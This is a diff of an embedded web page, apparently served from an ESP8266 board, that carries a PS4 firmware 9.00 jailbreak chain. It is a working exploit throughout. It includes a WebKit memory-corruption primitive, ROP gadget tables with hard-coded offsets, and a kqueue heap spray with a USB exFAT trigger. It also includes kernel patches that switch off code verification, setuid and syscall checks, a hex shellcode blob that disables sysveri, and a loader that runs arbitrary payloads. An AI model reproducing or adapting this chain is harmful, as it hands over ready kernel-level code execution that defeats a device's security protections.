@@ -6,6 +6,8 @@ static const char loaderData[] PROGMEM = R"==(
 <style>body{color:white;font-size:20px;text-align:center;margin:0;overflow:hidden;}.info{overflow: hidden;position: fixed;position: absolute;top: 45%;left: 50%;font-size: 25px;font-family: sans-serif;color: #b8b8b8;transform: translate(-50%, -50%);}</style>
 <script>
 
+// original exploit: https://github.com/ChendoChap/pOOBs4
+
 var payloadFile = sessionStorage.getItem('payload');
 var payloadTitle = sessionStorage.getItem('title');
 var usbWaitTime = sessionStorage.getItem('waittime');
@@ -14,6 +16,11 @@ var payloadData = "";
 if (!usbWaitTime)
 {
   usbWaitTime = 10000; //default if empty
+}
+
+function showMessage(msg) {
+  document.getElementById("message").innerHTML = msg;
+  document.getElementById("message").style.display='block';
 }
 
 function loadPayloadData() // preload payload data
@@ -36,9 +43,47 @@ function loadPayloadData() // preload payload data
 }
 
 
-function showMessage(msg) {
-  document.getElementById("message").innerHTML = msg;
-  document.getElementById("message").style.display='block';
+//ESP8266 usb functions - stooged
+function disableUSB() {
+  var getpl = new XMLHttpRequest();
+  getpl.open("POST", "./usboff", true);
+  getpl.send(null);
+}
+
+
+function enableUSB() {
+  var getpl = new XMLHttpRequest();
+  getpl.open("POST", "./usbon", true);
+  getpl.send(null);
+}
+
+
+function injectPayload() //dynamic payload inject - stooged
+{
+    if (payloadData.length > 0)
+    {
+       var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
+       var bufLen = payloadData.length;
+       var payload_loader = p.malloc32(bufLen);
+       var loader_writer = payload_loader.backing;
+       for(var i=0;i<bufLen/4;i++){
+            var hxVal = payloadData.slice(i*4,4+(i*4)).split("").reverse().join("").split("").map(function(s){return("0000" + s.charCodeAt(0).toString(16)).slice(-2);}).join("");
+            loader_writer[i] = parseInt(hxVal, 16);
+       }
+       chain.syscall(74, payload_loader, bufLen, (0x1 | 0x2 | 0x4));
+       var pthread = p.malloc(0x10);
+       chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_loader, payload_buffer);
+       showMessage(payloadTitle + " Loaded.");
+    }
+  else
+  {
+       showMessage("No Payload Data!");
+  }
+}
+
+
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
 }
 
 loadPayloadData();
@@ -144,7 +189,7 @@ function zeroFill(number, width) {
 </script>
 <script>
 const stack_sz = 0x40000;
-const reserve_upper_stack = 0x8000;
+const reserve_upper_stack = 0x10000;
 const stack_reserved_idx = reserve_upper_stack / 4;
 
 
@@ -225,6 +270,10 @@ window.rop = function () {
             this.push(r9);
         }
 
+        if (this.stack.add32(this.count * 0x8).low & 0x8) {
+            this.push(gadgets["ret"]);
+        }
+
         this.push(rip);
         return this;
     }
@@ -293,11 +342,26 @@ window.rop = function () {
         this.push(qword);
         this.push(gadgets["mov [rax], rsi"]);
     }
+
     this.kwrite4 = function (offset, dword) {
         this.rax_kernel(offset);
         this.push(gadgets["pop rdx"]);
         this.push(dword);
         this.push(gadgets["mov [rax], edx"]);
+    }
+
+    this.kwrite2 = function (offset, word) {
+        this.rax_kernel(offset);
+        this.push(gadgets["pop rcx"]);
+        this.push(word);
+        this.push(gadgets["mov [rax], cx"]);
+    }
+
+    this.kwrite1 = function (offset, byte) {
+        this.rax_kernel(offset);
+        this.push(gadgets["pop rcx"]);
+        this.push(byte);
+        this.push(gadgets["mov [rax], cl"]);
     }
 
     this.kwrite8_kaddr = function (offset1, offset2) {
@@ -309,7 +373,6 @@ window.rop = function () {
     return this;
 };
 </script>
-
 <script>
 var chain;
 var kchain;
@@ -379,7 +442,9 @@ var wk_gadgetmap = {
     "add rax, rcx": 0x2FBCD,
     "mov rsp, rdi": 0x2048062,
     "mov rdi, [rax + 8] ; call [rax]": 0x751EE7,
-    "infloop": 0x7DFF
+    "infloop": 0x7DFF,
+
+    "mov [rax], cl": 0xC6EAF,
 };
 
 var wkr_gadgetmap = {
@@ -389,6 +454,7 @@ var wkr_gadgetmap = {
 var wk2_gadgetmap = {
     "mov [rax], rdi": 0xFFDD7,
     "mov [rax], rcx": 0x2C9ECA,
+    "mov [rax], cx": 0x15A7D52,
 };
 var hmd_gadgetmap = {
     "add [r8], r12": 0x2BCE1
@@ -397,9 +463,10 @@ var ipmi_gadgetmap = {
     "mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]": 0x344B
 };
 
-
-
 function userland() {
+
+    //RW -> ROP method is strongly based off of:
+    //https://github.com/Cryptogenic/PS4-6.20-WebKit-Code-Execution-Exploit
 
     p.launch_chain = launch_chain;
     p.malloc = malloc;
@@ -407,10 +474,6 @@ function userland() {
     p.stringify = stringify;
     p.array_from_address = array_from_address;
     p.readstr = readstr;
-
-    var textAreaAddr = p.leakval(textArea);
-    var textAreVtablePtrPtr = textAreaAddr.add32(0x18);
-    var textAreaVtPtr = p.read8(textAreVtablePtrPtr);
 
     //pointer to vtable address
     var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
@@ -465,7 +528,8 @@ function userland() {
         var og_array_i = p.leakval(og_array).add32(0x10);
 
         p.write8(og_array_i, addr);
-        p.write4(og_array_i.add32(8), size);
+        p.write4(og_array_i.add32(0x8), size);
+        p.write4(og_array_i.add32(0xC), 0x1);
 
         nogc.push(og_array);
         return og_array;
@@ -491,17 +555,6 @@ function userland() {
 
         }
         return str;
-    }
-
-    function array_from_address(addr, size) {
-        var og_array = new Uint32Array(0x1000);
-        var og_array_i = p.leakval(og_array).add32(0x10);
-
-        p.write8(og_array_i, addr);
-        p.write4(og_array_i.add32(8), size);
-
-        nogc.push(og_array);
-        return og_array;
     }
 
     var fakeVtable_setjmp = p.malloc32(0x200);
@@ -567,50 +620,12 @@ function userland() {
     p.write8(kstr, orig_kview_buf);
 
     chain = new rop();
-}
 
-
-//ESP8266 usb functions - stooged
-function disableUSB() {
-  var getpl = new XMLHttpRequest();
-  getpl.open("POST", "./usboff", true);
-  getpl.send(null);
-}
-
-
-function enableUSB() {
-  var getpl = new XMLHttpRequest();
-  getpl.open("POST", "./usbon", true);
-  getpl.send(null);
-}
-
-
-function injectPayload() //dynamic payload inject - stooged
-{
-    if (payloadData.length > 0)
-    {
-       var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
-       var bufLen = payloadData.length;
-       var payload_loader = p.malloc32(bufLen);
-       var loader_writer = payload_loader.backing;
-       for(var i=0;i<bufLen/4;i++){
-            var hxVal = payloadData.slice(i*4,4+(i*4)).split("").reverse().join("").split("").map(function(s){return("0000" + s.charCodeAt(0).toString(16)).slice(-2);}).join("");
-            loader_writer[i] = parseInt(hxVal, 16);
-       }
-       chain.syscall(74, payload_loader, bufLen, (0x1 | 0x2 | 0x4));
-       var pthread = p.malloc(0x10);
-       chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_loader, payload_buffer);
-       showMessage(payloadTitle + " Loaded.");
+    //Sanity check
+    if (chain.syscall(20).low == 0) {
+        alert("webkit exploit failed. Try again if your ps4 is on fw 9.00.");
+        while (1);
     }
-  else
-  {
-       showMessage("No Payload Data!");
-  }
-}
-
-
-function sleep(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
 }
 
 
@@ -664,12 +679,15 @@ function load_prx(name) {
     return tlsinit;
 }
 
+//Obtain extra gadgets through module loading
 function extra_gadgets() {
-    handle = p.malloc(0x150);
-    var randomized_path_ptr = handle.add32(0x4);
-    ex_info = randomized_path_ptr.add32(0x30);
+    handle = p.malloc(0x1E8);
+    var randomized_path_length_ptr = handle.add32(0x4);
+    var randomized_path_ptr = handle.add32(0x14);
+    ex_info = randomized_path_ptr.add32(0x40);
 
-    chain.syscall(602, 0, randomized_path_ptr);
+    p.write8(randomized_path_length_ptr, 0x2C);
+    chain.syscall(602, 0, randomized_path_ptr, randomized_path_length_ptr);
     random_path = p.readstr(randomized_path_ptr);
 
     var ipmi_addr = load_prx("libSceIpmi.sprx");
@@ -688,10 +706,24 @@ function extra_gadgets() {
 
     for (var gadget in window.gadgets) {
         p.read8(window.gadgets[gadget]);
+        //Ensure all gadgets are available to kernel.
+        chain.fcall(window.syscalls[203], window.gadgets[gadget], 0x10);
     }
+    chain.run();
 }
 
+//Build the kernel rop chain, this is what the kernel will be executing when the fake obj pivots the stack.
 function kchain_setup() {
+    const KERNEL_busy = 0x1B28DF8;
+
+    const KERNEL_bcopy = 0xACD;
+    const KERNEL_bzero = 0x2713FD;
+    const KERNEL_pagezero = 0x271441;
+    const KERNEL_memcpy = 0x2714BD;
+    const KERNEL_pagecopy = 0x271501;
+    const KERNEL_copyin = 0x2716AD;
+    const KERNEL_copyinstr = 0x271B5D;
+    const KERNEL_copystr = 0x271C2D;
     const KERNEL_setidt = 0x312c40;
     const KERNEL_setcr0 = 0x1FB949;
     const KERNEL_Xill = 0x17d500;
@@ -704,14 +736,13 @@ function kchain_setup() {
     const KERNEL_prx = 0x23AEC4;
     const KERNEL_dlsym_1 = 0x23B67F;
     const KERNEL_dlsym_2 = 0x221b40;
-
-
     const KERNEL_setuid = 0x1A06;
     const KERNEL_syscall11_1 = 0x1100520;
     const KERNEL_syscall11_2 = 0x1100528;
     const KERNEL_syscall11_3 = 0x110054C;
     const KERNEL_syscall11_gadget = 0x4c7ad;
-    const KERNEL_mmap = 0x16632A;
+    const KERNEL_mmap_1 = 0x16632A;
+    const KERNEL_mmap_2 = 0x16632D;
     const KERNEL_setcr0_patch = 0x3ade3B;
     const KERNEL_kqueue_close_epi = 0x398991;
 
@@ -724,6 +755,13 @@ function kchain_setup() {
 
     kchain = new rop();
     kchain2 = new rop();
+    //Ensure the krop stack remains available.
+    {
+        chain.fcall(window.syscalls[203], kchain.stackback, 0x40000);
+        chain.fcall(window.syscalls[203], kchain2.stackback, 0x40000);
+        chain.fcall(window.syscalls[203], SAVED_KERNEL_STACK_PTR, 0x10);
+    }
+    chain.run();
 
     kchain.count = 0;
     kchain2.count = 0;
@@ -738,6 +776,9 @@ function kchain_setup() {
     kchain.push(KERNEL_BASE_PTR);
     kchain.push(gadgets["add [r8], r12"]);
 
+    //Sorry we're closed
+    kchain.kwrite1(KERNEL_busy, 0x1);
+    kchain.push(gadgets["sti"]); //it should be safe to re-enable interrupts now.
 
 
     var idx1 = kchain.write_kernel_addr_to_chain_later(KERNEL_setidt);
@@ -766,8 +807,23 @@ function kchain_setup() {
     kchain.finalizeSymbolic(idx1, idx1_dest);
     kchain.finalizeSymbolic(idx2, idx2_dest);
 
-    //Restore original UD
 
+    //Initial patch(es)
+    kchain2.kwrite2(KERNEL_veriPatch, 0x9090);
+    kchain2.kwrite1(KERNEL_bcopy, 0xEB);
+    //might as well do the others
+    kchain2.kwrite1(KERNEL_bzero, 0xEB);
+    kchain2.kwrite1(KERNEL_pagezero, 0xEB);
+    kchain2.kwrite1(KERNEL_memcpy, 0xEB);
+    kchain2.kwrite1(KERNEL_pagecopy, 0xEB);
+    kchain2.kwrite1(KERNEL_copyin, 0xEB);
+    kchain2.kwrite1(KERNEL_copyinstr, 0xEB);
+    kchain2.kwrite1(KERNEL_copystr, 0xEB);
+
+    //I guess you're not all that bad...
+    kchain2.kwrite1(KERNEL_busy, 0x0); //it should now be safe to handle timer-y interrupts again
+
+    //Restore original UD
     var idx3 = kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);
     var idx4 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);
     kchain2.push(gadgets["pop rdi"]);
@@ -788,22 +844,20 @@ function kchain_setup() {
     kchain2.finalizeSymbolic(idx4, idx4_dest);
 
     //Apply kernel patches    
-
-    kchain2.kwrite4(KERNEL_veriPatch, 0x83489090);
-
     kchain2.kwrite4(KERNEL_enable_syscalls_1, 0x00000000);
     //patch in reverse because /shrug
-    kchain2.kwrite4(KERNEL_enable_syscalls_4, 0x04EB69EB);
-    kchain2.kwrite4(KERNEL_enable_syscalls_3, 0x3B489090);
-    kchain2.kwrite4(KERNEL_enable_syscalls_2, 0xC9859090);
+    kchain2.kwrite1(KERNEL_enable_syscalls_4, 0xEB);
+    kchain2.kwrite2(KERNEL_enable_syscalls_3, 0x9090);
+    kchain2.kwrite2(KERNEL_enable_syscalls_2, 0x9090);
 
-    kchain2.kwrite4(KERNEL_setuid, 0x8B482AEB);
+    kchain2.kwrite1(KERNEL_setuid, 0xEB);
     kchain2.kwrite4(KERNEL_mprotect, 0x00000000);
-    kchain2.kwrite4(KERNEL_prx, 0x00C0E990);
-    kchain2.kwrite4(KERNEL_dlsym_1, 0x8B484CEB);
+    kchain2.kwrite2(KERNEL_prx, 0xE990);
+    kchain2.kwrite1(KERNEL_dlsym_1, 0xEB);
     kchain2.kwrite4(KERNEL_dlsym_2, 0xC3C03148);
 
-    kchain2.kwrite4(KERNEL_mmap, 0x37B24137);
+    kchain2.kwrite1(KERNEL_mmap_1, 0x37);
+    kchain2.kwrite1(KERNEL_mmap_2, 0x37);
 
     kchain2.kwrite4(KERNEL_syscall11_1, 0x00000002);
     kchain2.kwrite8_kaddr(KERNEL_syscall11_2, KERNEL_syscall11_gadget);
@@ -817,7 +871,6 @@ function kchain_setup() {
     var idx5_dest = kchain2.get_rsp();
     kchain2.pushSymbolic(); // overwritten with KERNEL_setcr0_patch
     kchain2.finalizeSymbolic(idx5, idx5_dest);
-
 
     //Recover
     kchain2.rax_kernel(KERNEL_kqueue_close_epi);
@@ -841,7 +894,7 @@ function kchain_setup() {
 
 function object_setup() {
     //Map fake object
-    var fake_knote = chain.syscall(477, 0x4000, 0x4000 * 0x3, 0x3, 0x1012, 0xFFFFFFFF, 0x0);
+    var fake_knote = chain.syscall(477, 0x4000, 0x4000 * 0x3, 0x3, 0x1010, 0xFFFFFFFF, 0x0);
     var fake_filtops = fake_knote.add32(0x4000);
     var fake_obj = fake_knote.add32(0x8000);
     if (fake_knote.low != 0x4000) {
@@ -865,15 +918,15 @@ function object_setup() {
     {
         p.write8(fake_obj.add32(0x30), gadgets["mov rdi, [rax + 8] ; call [rax]"]); //mov rdi, qword ptr [rax + 8] ; call qword ptr [rax]
     }
+    //Ensure the fake knote remains available
+    chain.syscall(203, fake_knote, 0xC000);
 }
 
-
-var trigger_spray =  function () {
-    //Make socket <= 0xFF | -> alloc 0x800
+var trigger_spray = function () {
 
     var NUM_KQUEUES = 0x1B0;
     var kqueue_ptr = p.malloc(NUM_KQUEUES * 0x4);
-    //Make Kqueues
+    //Make kqueues
     {
         for (var i = 0; i < NUM_KQUEUES; i++) {
             chain.fcall(window.syscalls[362]);
@@ -895,7 +948,9 @@ var trigger_spray =  function () {
     p.write4(kevent.add32(0x8), 0xFFFF + 0x010000);
     p.write4(kevent.add32(0xC), 0x0);
     p.write8(kevent.add32(0x10), 0x0);
-    p.write8(kevent.add32(0x18), 0x0); {
+    p.write8(kevent.add32(0x18), 0x0);
+    //
+    {
         for (var i = 0; i < NUM_KQUEUES; i++) {
             chain.fcall(window.syscalls[363], kqueues[i], kevent, 0x1, 0x0, 0x0, 0x0);
         }
@@ -904,14 +959,14 @@ var trigger_spray =  function () {
 
     //Fragment memory
     {
-        for (var i = 20; i < NUM_KQUEUES; i += 2) {
+        for (var i = 18; i < NUM_KQUEUES; i += 2) {
             chain.fcall(window.syscalls[6], kqueues[i]);
         }
     }
     chain.run();
 
     //Trigger OOB
-  
+
     //ESP8266 enable usb - stooged
     showMessage("Loading USB, ExFatHax...");
     enableUSB();
@@ -928,9 +983,29 @@ var trigger_spray =  function () {
         chain.run();
 
         if (chain.syscall(23, 0).low == 0) {
+			
+            //cleanup fake knote & release locked gadgets/stack.
+            chain.fcall(window.syscalls[73], 0x4000, 0xC000);
+            chain.fcall(window.syscalls[325]);
+            chain.run();
+			
             disableUSB();
+            
+            //This disables sysveri, see https://github.com/ChendoChap/pOOBs4/blob/main/patch.s for more info
+            var patch_buffer = chain.syscall(477, 0x0, 0x4000, 0x7, 0x1000, 0xFFFFFFFF, 0);
+            var patch_buffer_view = p.array_from_address(patch_buffer, 0x1000);
+            var PatchPl = [0x00000BB8,0xFE894800,0x033D8D48,0x0F000000,0x4855C305,0x8B48E589,0x95E8087E,0xE8000000,0x00000175,0x033615FF,0x8B480000,0x0003373D,0x3F8B4800,0x74FF8548,0x3D8D48EB,0x0000029D,0xF9358B48,0x48000002,0x0322158B,0x8B480000,0x00D6E812,0x8D480000,0x00029F3D,0x358B4800,0x000002E4,0x05158B48,0x48000003,0xB9E8128B,0x48000000,0x02633D8D,0x8B480000,0x0002BF35,0x158B4800,0x000002C8,0xE8128B48,0x0000009C,0x7A3D8D48,0x48000002,0x02AA358B,0x8B480000,0x0002AB15,0x128B4800,0x00007FE8,0x0185E800,0xC35D0000,0x6D3D8948,0x48000002,0x026E3D01,0x01480000,0x00026F3D,0x3D014800,0x00000270,0x713D0148,0x48000002,0x02723D01,0x01480000,0x0002933D,0x3D014800,0x00000294,0x653D0148,0x48000002,0x02663D01,0x01480000,0x0002873D,0x3D014800,0x00000288,0x893D0148,0x48000002,0x028A3D01,0x01480000,0x00028B3D,0x3D014800,0x0000024C,0x3D3D0148,0xC3000002,0xE5894855,0x10EC8348,0x24348948,0x24548948,0xED15FF08,0x48000001,0x4B74C085,0x48C28948,0x4840408B,0x2F74C085,0x28788B48,0x243C3B48,0x8B480A74,0xC0854800,0xECEB1D74,0x18788B48,0x74FF8548,0x7F8B48ED,0x7C3B4810,0xE2750824,0xFF1040C7,0x48FFFFFF,0x31107A8D,0x31D231F6,0xA515FFC9,0x48000001,0x5D10C483,0x894855C3,0xC0200FE5,0xFFFF2548,0x220FFFFE,0x3D8B48C0,0x000001C8,0x909007C7,0x47C79090,0x48909004,0x358B48B8,0x000001AC,0x08778948,0x651047C7,0xC73C8B48,0x00251447,0x47C70000,0x89480018,0x1C47C738,0xB8489090,0x7D358B48,0x48000001,0xC7207789,0xC7482847,0x47C70100,0x0000002C,0x778D48E9,0x158B4834,0x00000150,0x89F22948,0x8B483057,0x00016B35,0x568D4800,0xD7294805,0xC148FF89,0x814808E7,0x0000E9CF,0x3E894800,0x00000D48,0x220F0001,0x55C35DC0,0x0FE58948,0x2548C020,0xFFFEFFFF,0x48C0220F,0x013A3D8B,0x07C70000,0x00C3C031,0x353D8B48,0xC7000001,0xC3C03107,0x3D8B4800,0x00000130,0xC03107C7,0x8B4800C3,0x00012B3D,0x3107C700,0x4800C3C0,0x00A63D8B,0x87C70000,0x001F1E01,0x9090F631,0x1E0587C7,0xC931001F,0x87C79090,0x001F1E09,0x9090D231,0x1E3E87C7,0xC931001F,0x0D489090,0x00010000,0xFFC0220F,0x0000EF15,0xC0200F00,0xFFFF2548,0x220FFFFE,0x3D8B48C0,0x000000DC,0xC03107C7,0x0D4800C3,0x00010000,0x5DC0220F,0x737973C3,0x5F6D6574,0x70737573,0x5F646E65,0x73616870,0x705F3265,0x735F6572,0x00636E79,0x74737973,0x725F6D65,0x6D757365,0x68705F65,0x32657361,0x73797300,0x5F6D6574,0x75736572,0x705F656D,0x65736168,0x90900033,0x00000000,0x00000000,0x000F88F0,0x00000000,0x002EF170,0x00000000,0x00018DF0,0x00000000,0x00018EF0,0x00000000,0x02654110,0x00000000,0x00097230,0x00000000,0x00402E60,0x00000000,0x01520108,0x00000000,0x01520100,0x00000000,0x00462D20,0x00000000,0x00462DFC,0x00000000,0x006259A0,0x00000000,0x006268D0,0x00000000,0x00625DC0,0x00000000,0x00626290,0x00000000,0x00626720,0x00000000];
+            for(var i=0; i < PatchPl.length; i++)
+            {
+              patch_buffer_view[i] = PatchPl[i];
+            }
+            chain.fcall(window.syscalls[203], patch_buffer, 0x4000);
+            chain.fcall(patch_buffer, p.read8(KERNEL_BASE_PTR));
+            chain.fcall(window.syscalls[73], patch_buffer, 0x4000);
+            chain.run();
+
             showMessage("Loading " + payloadTitle + "...");
-            setTimeout(injectPayload, 5000);
+            setTimeout(injectPayload, 3000);
         }
         else
         {
@@ -1329,9 +1404,12 @@ function poc() {
     var expl_slave = new Uint32Array(2);
     var addrof_expl_slave = addrof(expl_slave);
     var m = fakeobj(addrof(obj) + 16);
+    obj.buffer = expl_slave;
+    m[7] = 1;
     obj.buffer = expl_master;
     m[4] = addrof_expl_slave;
     m[5] = (addrof_expl_slave - addrof_expl_slave % 0x100000000) / 0x100000000;
+    m[7] = 1;
 
     var prim = {
         write8: function (addr, value) {
